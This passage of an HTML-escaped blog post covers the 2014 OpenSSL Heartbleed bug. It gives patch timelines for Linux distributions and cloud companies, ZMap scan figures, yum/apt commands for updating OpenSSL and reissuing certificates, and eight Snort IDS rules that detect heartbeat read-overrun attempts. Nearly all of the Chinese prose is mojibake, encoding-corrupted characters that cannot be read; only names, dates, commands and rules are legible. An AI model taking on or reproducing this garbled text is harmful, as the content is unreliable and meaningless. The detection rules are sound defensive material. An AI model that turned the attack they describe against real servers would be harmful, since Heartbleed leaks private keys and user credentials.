    &lt;li&gt;CentOS Á¥ÑÂú® 2014Âπ¥4Êúà8Êó• 02:49 Ê≠£Âºè‰øÆÂæ©„ÄÇ&lt;/li&gt;
    &lt;li&gt;OpenSUSE Á¥ÑÂú® 2014Âπ¥4Êúà8Êó• 05:32 Ê≠£Âºè‰øÆÂæ©„ÄÇ&lt;/li&gt;
    &lt;li&gt;Scentific Á¥ÑÂú® 2014Âπ¥4Êúà8Êó• 08:27 Ê≠£Âºè‰øÆÂæ©„ÄÇ&lt;/li&gt;
    &lt;li&gt;Gentoo Á¥ÑÂú® 2014Âπ¥4Êúà8Êó• 09:36 Ê≠£Âºè‰øÆÂæ©„ÄÇ&lt;/li&gt;
  &lt;/ol&gt;

  &lt;p&gt;ÈáçÈªûÊï¥ÁêÜÔºö&lt;/p&gt;
  &lt;ol&gt;
    &lt;li&gt;RedHat ‰øÆÂæ©ÁöÑÈÄüÂ∫¶ÊØî OpenSSL ÂÆòÊñπÈÇÑÂø´„ÄÇ&lt;/li&gt;
    &lt;li&gt;RedHat Ê¥æÁ≥ªÁöÑ‰øÆÂæ©ÊôÇÈñìÔºåÈô§‰∫Ü RedHat Â§ñÈÉΩÁÆóÊÖ¢ÔºåÂ¶Ç Fedora Âèä CentOS„ÄÅScentificÔºå‰ªñÂÄëÈÉΩÊØî RedHat ÊÖ¢ 16 Â∞èÊôÇ‰ª•‰∏ä„ÄÇ&lt;/li&gt;
    &lt;li&gt;Debian Ê¥æÁ≥ªÁöÑ‰øÆÂæ©ÊôÇÈñìÔºåÂ¶Ç Debian Âèä UbuntuÔºåÈÉΩÊØî RedHat ÊÖ¢‰∏äËá≥Â∞ë 12 Â∞èÊôÇ‰ª•‰∏ä„ÄÇ&lt;/li&gt;
    &lt;li&gt;Gentoo ÊòØÂàóË°®‰∏≠‰øÆÂæ©ÊúÄÊÖ¢ÁöÑ„ÄÇ&lt;/li&gt;
    &lt;li&gt;Ëã•‰ª•Ë≥áÂÆâÈªÉÈáë 6 Â∞èÊôÇ‰æÜË™™ÔºåFedora„ÄÅCentOS„ÄÅOpenSUSE„ÄÅScentific Âèä Gentoo ÈÉΩ‰∏çÂèäÊ†º„ÄÇ&lt;/li&gt;
  &lt;/ol&gt;

  &lt;p&gt;‰∏â„ÄÅÂ§ßÂÖ¨Âè∏Êõ¥Êñ∞ÁöÑÈÄüÂ∫¶&lt;/p&gt;

  &lt;p&gt;ÂêåÊ®£Âú∞ÔºåÂæûË≥áÂÆâ‰∫ã‰ª∂ÁöÑËôïÁêÜÂèØ‰ª•Êé®Êï≤Âá∫ÂêÑÂÖ¨Âè∏Â∞çÊñºÁ∑äÊÄ•‰∫ã‰ª∂ÁöÑÂèçÊáâÈÄüÂ∫¶„ÄÇ&lt;/p&gt;

  &lt;p&gt;Èõ≤Á´ØÁõ∏ÈóúÂÖ¨Âè∏&lt;/p&gt;
  &lt;ul&gt;
    &lt;li&gt;Cloudflare Á¥ÑÂú® 2014Âπ¥4Êúà7Êó• 11ÊôÇ‰øÆÂæ©„ÄÇ&lt;/li&gt;
    &lt;li&gt;DigitalOcean Á¥ÑÂú® 2014Âπ¥4Êúà8Êó• 12ÊôÇ‰øÆÂæ©„ÄÇ&lt;/li&gt;
    &lt;li&gt;AWS Á¥ÑÂú® 2014Âπ¥4Êúà8Êó• 12ÊôÇ‰øÆÂæ©„ÄÇ&lt;/li&gt;
    &lt;li&gt;Linode Á¥ÑÂú® 2014Âπ¥4Êúà8Êó• 14ÊôÇ‰øÆÂæ©„ÄÇ&lt;/li&gt;
    &lt;li&gt;Heroku Á¥ÑÂú® 2014Âπ¥4Êúà8Êó• 16ÊôÇ‰øÆÂæ©„ÄÇ&lt;/li&gt;
  &lt;/ul&gt;

  &lt;p&gt;Êúâ‰∫õÂÖ¨Âè∏Áõ¥Âà∞ 2014Âπ¥4Êúà8Êó• 16ÊôÇÈÉΩÈÇÑÊ≤í‰øÆÂæ©„ÄÇÊ≠§ÊôÇÂ∑≤Èõ¢ÂÆòÊñπÊ≠£Âºè‰øÆÂæ©Êï¥Êï¥‰∏ÄÂ§©Ôºå‰πüÊØî‰∏äËø∞Ê©üÂô®Êï∏ÂæàÂ§öÁöÑÈõ≤Á´ØÁõ∏ÈóúÂÖ¨Âè∏ÈÇÑÊÖ¢„ÄÇÈÄô‰∫õÂÖ¨Âè∏ÁÇ∫Ôºå&lt;/p&gt;
  &lt;ul&gt;
    &lt;li&gt;Yahoo.com / Flickr.com&lt;/li&gt;
    &lt;li&gt;Kaspersky.com (Ë≥áÂÆâÂÖ¨Âè∏)&lt;/li&gt;
    &lt;li&gt;stackoverflow.com&lt;/li&gt;
    &lt;li&gt;stackexchange .com&lt;/li&gt;
    &lt;li&gt;php.net&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;ÊÑüË¨ù StackNG ÁöÑË£úÂÖÖÔºöCloudflare Êñº 2014 Âπ¥ 4 Êúà 7 Êó• 11 ÊôÇÂÖ¨ÂëäÔºå‰ΩÜÂú®ÊºèÊ¥ûÂÖ¨Âëä‰πãÂâçÂ∑≤Á∂ì‰øÆÂæ©„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÁõÆÂâçÈÇÑÊúâÂì™‰∫õ‰º∫ÊúçÂô®ÊúâÂïèÈ°åÂë¢&quot;&gt;ÁõÆÂâçÈÇÑÊúâÂì™‰∫õ‰º∫ÊúçÂô®ÊúâÂïèÈ°åÂë¢Ôºü&lt;/h3&gt;

&lt;p&gt;Ê†πÊìö &lt;a href=&quot;https://zmap.io/&quot;&gt;ZMap&lt;/a&gt; ÁöÑ&lt;a href=&quot;https://zmap.io/heartbleed/&quot;&gt;Á†îÁ©∂Â†±Âëä&lt;/a&gt;ÊåáÂá∫Ôºå‰ªñÂÄëÈáùÂ∞ç &lt;a href=&quot;http://s3.amazonaws.com/alexa-static/top-1m.csv.zip&quot;&gt;Alexa Ââç‰∏ÄÁôæËê¨ÂÄãÁ∂≤Á´ô&lt;/a&gt;ÈÄ≤Ë°åÊ™¢Ê∏¨ÔºåÂ§ßÁ¥ÑÊúâ 36% ÁöÑ‰º∫ÊúçÂô®ÊîØÊè¥ TLS„ÄÅ7.6% ÁöÑ‰º∫ÊúçÂô®Âê´ÊúâÊ≠§ÊºèÊ¥û„ÄÇZMap ‰∏¶Êèê‰æõ‰∫Ü‰∏ÄÂÄã&lt;a href=&quot;https://zmap.io/heartbleed/vulnerable.html&quot;&gt;ÂÆåÊï¥ÁöÑÊ∏ÖÂñÆ&lt;/a&gt;ÂàóÂá∫Âú® 2014/4/11 17:00 Â∞öÊú™‰øÆÂæ©ÊºèÊ¥ûÁöÑÁ∂≤Á´ô„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/s2560/2014-04-11-openssl-heartbleed-detail-06.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-06.png&quot; alt=&quot;ZMap.io Heartbleed vulnerable domains&quot; title=&quot;ZMap.io Heartbleed vulnerable domains&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;Êúâ‰ªÄÈ∫ºÂÄºÂæóÊ∏¨Ë©¶ÁöÑÁ∂≤Á´ôÂë¢&quot;&gt;Êúâ‰ªÄÈ∫ºÂÄºÂæóÊ∏¨Ë©¶ÁöÑÁ∂≤Á´ôÂë¢Ôºü&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-05.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-05.jpg&quot; alt=&quot;OpenSSL Heartbleed with a beer!&quot; title=&quot;OpenSSL Heartbleed with a beer!&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;via &lt;a href=&quot;https://www.facebook.com/photo.php?fbid=10201756684385494&quot;&gt;Facebook&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;ÊàëË¶ÅÊÄéÈ∫ºÊõ¥Êñ∞-openssl-Âë¢&quot;&gt;ÊàëË¶ÅÊÄéÈ∫ºÊõ¥Êñ∞ OpenSSL Âë¢Ôºü&lt;/h3&gt;

&lt;p&gt;Ê†πÊìö‰∏çÂêåÁöÑ Linux Distribution Êúâ‰∏çÂêåÁöÑÊõ¥Êñ∞ÊñπÂºèÔºåËã•ÊúâËá™Â∑±ÂÆ¢Ë£ΩÂåñ‰∏Ä‰∫õÁ®ãÂºèË®≠ÂÆöÔºåÂèØËÉΩÂ∞±ÈúÄË¶ÅËá™Ë°åÊõ¥Êñ∞„ÄÇ‰ª•‰∏ãÊàëÂÄëÁ∞°ÂñÆ‰ªãÁ¥πÊõ¥Êñ∞Ê≠•È©üÔºö&lt;/p&gt;

&lt;p&gt;RedHat / CentOS / Fedora Á≥ªÂàóÊõ¥Êñ∞Â•ó‰ª∂Ôºö&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;yum update
yum update openssl #Âè™Êõ¥Êñ∞ OpenSSL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Debian / Ubuntu Á≥ªÂàóÊõ¥Êñ∞Â•ó‰ª∂Ôºö&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get update
sudo apt-get dist-upgrade
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ëã•Âè™Ë¶ÅÊõ¥Êñ∞ OpenSSL ÂâáÂèØ‰ª•Âü∑Ë°å‰ª•‰∏ãÊåá‰ª§&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get install --only-upgrade openssl
sudo apt-get install --only-upgrade libssl1.0.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ê≥®ÊÑè OpenSSL ÊòØÂê¶Â∑≤Á∂ìÊõ¥Êñ∞ÁÇ∫‰øÆÂæ©ÁöÑÁâàÊú¨Ôºö&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rpm -q -a | grep &quot;openssl&quot;  # RedHat
dpkg -l | grep &quot;openssl&quot;    # Debian
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Êé•ËëóË´ãË®òÂæóÊí§Èä∑ÂéüÊú¨ÁöÑÁ∞ΩÁ´†ÈáëÈë∞ÔºåÈáçÊñ∞Á∞ΩÁΩ≤Ôºå‰∏¶Ë®òÂæóÊèê‰∫§ CSR (Certificate Signing Request) Áµ¶ CA (Certification Authority)„ÄÇ&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl req -new -newkey rsa:2048 -nodes -keyout hostname.key -out hostname.csr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÁµêÊùüÂæåË®òÂæóÈáçÊñ∞ÂïüÂãïÁõ∏ÈóúÊúçÂãô&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo service httpd restart      # RedHat
sudo service apache2 restart    # Debian
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÊúÄÂæåÂÜç‰ΩøÁî®Ê™¢Ê∏¨Â∑•ÂÖ∑ÁúãËá™Â∑±ÁöÑÁ∂≤È†Å‰º∫ÊúçÂô®ÊàñÂÖ∂‰ªñÁõ∏ÈóúÊúçÂãôÊòØÂê¶Â∑≤Á∂ì‰∏çÂú®ÊºèÊ¥ûÂèóÂÆ≥ÁØÑÂúç„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÊàëÁÑ°Ê≥ïÊõ¥Êñ∞ÊàëÁöÑ‰º∫ÊúçÂô®ÊàëË©≤ÊÄéÈ∫ºÂú®-ids-ÂÅµÊ∏¨ÊîªÊìäÂë¢&quot;&gt;ÊàëÁÑ°Ê≥ïÊõ¥Êñ∞ÊàëÁöÑ‰º∫ÊúçÂô®ÔºåÊàëË©≤ÊÄéÈ∫ºÂú® IDS ÂÅµÊ∏¨ÊîªÊìäÂë¢Ôºü&lt;/h3&gt;

&lt;p&gt;Ëã•‰Ω†‰ΩøÁî® Snort IDSÔºåÂÆòÊñπÂ∑≤Á∂ìÈáãÂá∫ SID 30510 Âà∞ 30517 ‰æÜÂÅµÊ∏¨Ôºå‰∏¶‰∏îÂú® Community Rules ‰∏≠‰πüÊúâÂåÖÂê´„ÄÇ
&lt;a href=&quot;http://www.snort.org/snort-rules/#community&quot;&gt;http://www.snort.org/snort-rules/#community&lt;/a&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-console&quot; data-lang=&quot;console&quot;&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;SIDs 30510 through 30517 address detection of the heartbleed attack 
&lt;span class=&quot;go&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;alert tcp $&lt;/span&gt;EXTERNAL_NET any -&amp;gt; &lt;span class=&quot;nv&quot;&gt;$HOME_NET&lt;/span&gt; 443 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;SERVER-OTHER OpenSSL SSLv3 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;heartbeat read overrun attempt&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flow:to_server,established; content:&quot;&lt;/span&gt;|18 03 00|&lt;span class=&quot;s2&quot;&gt;&quot;; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;depth:3;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dsize:&amp;gt;40; detection_filter:track by_src, count 3, seconds 1; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;metadata:policy balanced-ips drop, policy security-ips drop, service ssl;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;reference:cve,2014-0160;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;classtype:attempted-recon; sid:30510; rev:2;) 
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;alert tcp $&lt;/span&gt;EXTERNAL_NET any -&amp;gt; &lt;span class=&quot;nv&quot;&gt;$HOME_NET&lt;/span&gt; 443 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;SERVER-OTHER OpenSSL TLSv1 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;heartbeat read overrun attempt&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flow:to_server,established; content:&quot;&lt;/span&gt;|18 03 01|&lt;span class=&quot;s2&quot;&gt;&quot;; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;depth:3;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dsize:&amp;gt;40; detection_filter:track by_src, count 3, seconds 1; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;metadata:policy balanced-ips drop, policy security-ips drop, service ssl;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;reference:cve,2014-0160;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;classtype:attempted-recon; sid:30511; rev:2;) 
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;alert tcp $&lt;/span&gt;EXTERNAL_NET any -&amp;gt; &lt;span class=&quot;nv&quot;&gt;$HOME_NET&lt;/span&gt; 443 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;SERVER-OTHER OpenSSL TLSv1.1 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;heartbeat read overrun attempt&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flow:to_server,established; content:&quot;&lt;/span&gt;|18 03 02|&lt;span class=&quot;s2&quot;&gt;&quot;; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;depth:3;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dsize:&amp;gt;40; detection_filter:track by_src, count 3, seconds 1; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;metadata:policy balanced-ips drop, policy security-ips drop, service ssl;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;reference:cve,2014-0160;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;classtype:attempted-recon; sid:30512; rev:2;) 
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;alert tcp $&lt;/span&gt;EXTERNAL_NET any -&amp;gt; &lt;span class=&quot;nv&quot;&gt;$HOME_NET&lt;/span&gt; 443 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;SERVER-OTHER OpenSSL TLSv1.2 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;heartbeat read overrun attempt&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flow:to_server,established; content:&quot;&lt;/span&gt;|18 03 03|&lt;span class=&quot;s2&quot;&gt;&quot;; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;depth:3;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dsize:&amp;gt;40; detection_filter:track by_src, count 3, seconds 1; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;metadata:policy balanced-ips drop, policy security-ips drop, service ssl;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;reference:cve,2014-0160;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;classtype:attempted-recon; sid:30513; rev:2;) 
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;alert tcp $&lt;/span&gt;HOME_NET 443 -&amp;gt; &lt;span class=&quot;nv&quot;&gt;$EXTERNAL_NET&lt;/span&gt; any &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;SERVER-OTHER SSLv3 large 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;heartbeat response - possible ssl heartbleed attempt&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flow:to_client,established; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;content:&quot;|18 03 00|&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;depth:3; byte_test:2,&amp;gt;,128,0,relative; detection_filter:track 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;by_dst, count 5, seconds 60;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;metadata:policy balanced-ips drop, policy security-ips 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;drop, service ssl;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;reference:cve,2014-0160; classtype:attempted-recon; sid:30514; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;rev:3;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;) 
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;alert tcp $&lt;/span&gt;HOME_NET 443 -&amp;gt; &lt;span class=&quot;nv&quot;&gt;$EXTERNAL_NET&lt;/span&gt; any &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;SERVER-OTHER TLSv1 large 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;heartbeat response - possible ssl heartbleed attempt&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flow:to_client,established; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;content:&quot;|18 03 01|&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;depth:3; byte_test:2,&amp;gt;,128,0,relative; detection_filter:track 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;by_dst, count 5, seconds 60;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;metadata:policy balanced-ips drop, policy security-ips 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;drop, service ssl;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;reference:cve,2014-0160; classtype:attempted-recon; sid:30515; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;rev:3;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;) 
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;alert tcp $&lt;/span&gt;HOME_NET 443 -&amp;gt; &lt;span class=&quot;nv&quot;&gt;$EXTERNAL_NET&lt;/span&gt; any &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;SERVER-OTHER TLSv1.1 large 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;heartbeat response - possible ssl heartbleed attempt&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flow:to_client,established; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;content:&quot;|18 03 02|&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;depth:3; byte_test:2,&amp;gt;,128,0,relative; detection_filter:track 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;by_dst, count 5, seconds 60;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;metadata:policy balanced-ips drop, policy security-ips 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;drop, service ssl;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;reference:cve,2014-0160; classtype:attempted-recon; sid:30516; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;rev:3;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;) 
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;alert tcp $&lt;/span&gt;HOME_NET 443 -&amp;gt; &lt;span class=&quot;nv&quot;&gt;$EXTERNAL_NET&lt;/span&gt; any &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;SERVER-OTHER TLSv1.2 large 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;heartbeat response - possible ssl heartbleed attempt&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flow:to_client,established; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;content:&quot;|18 03 03|&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;depth:3; byte_test:2,&amp;gt;,128,0,relative; detection_filter:track 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;by_dst, count 5, seconds 60;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;metadata:policy balanced-ips drop, policy security-ips 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;drop, service ssl;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;reference:cve,2014-0160; classtype:attempted-recon; sid:30517; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;rev:3;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;) &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;Ê∞ëÁúæËàáÁÆ°ÁêÜËÄÖÊáâÂ∞çÊé™ÊñΩ&quot;&gt;Ê∞ëÁúæËàáÁÆ°ÁêÜËÄÖÊáâÂ∞çÊé™ÊñΩ&lt;/h3&gt;

&lt;p&gt;‰∏çÂ∞ëÊúãÂèã‰æÜ‰ø°„ÄÅÁïôË®ÄÊ¥ΩË©¢ÔºåÂà∞Â∫ïËá™Â∑±Ë©≤ÊÄéÈ∫ºÈáùÂ∞çÈÄôÊ¨°ÁöÑÊºèÊ¥ûÊáâËÆäÔºüÊàëÂÄëÁ∞°ÂñÆÂ∞±‰∏ÄËà¨Ê∞ëÁúæ‰ª•ÂèäÁ≥ªÁµ±ÁÆ°ÁêÜËÄÖË™™Êòé„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;‰∏ÄËà¨Ê∞ëÁúæÊáâÂ∞çÊé™ÊñΩ&quot;&gt;‰∏ÄËà¨Ê∞ëÁúæÊáâÂ∞çÊé™ÊñΩ&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Ê≥®ÊÑèÂ∏∏Áî®ÁöÑÈáçË¶ÅÁ∂≤Á´ôÊúçÂãôÔºåÊòØÂê¶ÊúâÈáùÂ∞ç Heartbleed ÊºèÊ¥ûÁöÑÊõ¥Êñ∞Êé™ÊñΩ„ÄÇ‰∏çÂ∞ëÂ§ßÂÖ¨Âè∏ÈÉΩÊúâÁôºÂá∫ÂÖ¨Âëä„ÄÅÂÖ¨Âëä‰ø°Á≠â„ÄÇ&lt;/li&gt;
  &lt;li&gt;Ëã•Â∏∏Áî®Á∂≤Á´ôÊúçÂãôÊúâÈÅ≠ÈÅáÊ≠§È¢®Èö™ÔºåË®òÂæóÊõ¥ÊèõÂ∏≥ËôüÂØÜÁ¢º„ÄÇ&lt;/li&gt;
  &lt;li&gt;Ëã•ÈÄôÊÆµÊôÇÈñìÊúâÁ∂≤Á´ôÈÄöÁü•Êõ¥ÊèõÂØÜÁ¢ºÔºå‰πüË´ãÊ≥®ÊÑèÊòØÂê¶ÁÇ∫Èá£È≠ö‰ø°‰ª∂„ÄÇ&lt;/li&gt;
  &lt;li&gt;Ê≥®ÊÑèËá™Â∑±ÁöÑÂ∏≥ËôüÊòØÂê¶ÊúâÁï∞Â∏∏Ê¥ªÂãï„ÄÇ&lt;/li&gt;
  &lt;li&gt;Ëã•‰ΩøÁî®ÁöÑÁ∂≤Á´ôÊúçÂãôÂ∞±ÊòØ‰∏çÊõ¥Êñ∞Ôºå&lt;strong&gt;‰∏ÄÂ§©‰∏Ä‰ø°ÂèãÂñÑÊèêÈÜíÁÆ°ÁêÜËÄÖ&lt;/strong&gt;„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Á≥ªÁµ±ÁÆ°ÁêÜËÄÖÊáâÂ∞çÊé™ÊñΩ&quot;&gt;Á≥ªÁµ±ÁÆ°ÁêÜËÄÖÊáâÂ∞çÊé™ÊñΩ&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Êõ¥Êñ∞ OpenSSL Ëá≥ 1.0.1g Êàñ 1.0.2-beta2Ôºå‰∏¶ÂØÜÂàáÊ≥®ÊÑèÊúâÁÑ°ÂæåÁ∫åÊõ¥Êñ∞„ÄÇ&lt;/li&gt;
